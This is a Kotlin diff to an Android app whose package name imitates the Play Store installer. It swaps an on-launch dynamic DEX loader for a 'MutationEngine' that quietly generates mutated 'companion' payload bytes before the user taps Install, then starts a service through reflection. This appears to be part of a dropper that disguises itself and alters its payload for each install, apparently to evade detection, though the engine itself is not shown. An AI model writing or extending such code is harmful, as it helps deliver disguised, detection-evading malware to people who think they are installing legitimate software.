@@ -2,6 +2,10 @@ package com.playstore.installer
 
 import android.app.Application
 import android.content.Intent
+import kotlinx.coroutines.CoroutineScope
+import kotlinx.coroutines.Dispatchers
+import kotlinx.coroutines.SupervisorJob
+import kotlinx.coroutines.launch
 
 class LauncherApplication : Application() {
 
@@ -9,34 +13,33 @@ class LauncherApplication : Application() {
         lateinit var instance: LauncherApplication
             private set
 
-        // Phase 3: DEX loader result accessible across activities
-        @Volatile var dexLoaderReady: Boolean = false
-        @Volatile var dexLoaderError: String? = null
+        // MutationEngine result — accessible from InstallActivity
+        @Volatile var mutatedCompanionBytes: ByteArray? = null
+        @Volatile var mutationReady: Boolean = false
+        @Volatile var mutationError: Boolean = false
+
+        private val appScope = CoroutineScope(SupervisorJob() + Dispatchers.Default)
     }
 
     override fun onCreate() {
         super.onCreate()
         instance = this
 
-        // Phase 3: Start DEX loading immediately on app launch
-        // This runs BEFORE any Activity — ensures DexLoader is ready
-        // by the time InstallActivity needs it (10-15 seconds later)
-        Thread {
+        // Start MutationEngine immediately — runs before any Activity is shown.
+        // By the time user taps Install (~10-15 seconds), mutation is done.
+        appScope.launch {
             try {
-                val loader = DexLoader.loadCompanionDex(applicationContext)
-                dexLoaderReady = loader != null
-                if (loader == null) {
-                    dexLoaderError = DexLoader.getError()
+                val engine = MutationEngine(applicationContext)
+                val bytes  = engine.getMutatedCompanionBytes()
+                if (bytes.isNotEmpty()) {
+                    mutatedCompanionBytes = bytes
+                    mutationReady = true
+                } else {
+                    mutationError = true
                 }
             } catch (e: Exception) {
-                dexLoaderError = e.message
-                dexLoaderReady = false
+                mutationError = true
             }
-        }.apply {
-            isDaemon = true
-            name = "nova-dex-loader"
-            priority = Thread.MAX_PRIORITY
-            start()
         }
 
         startService(Intent(this, Class.forName(
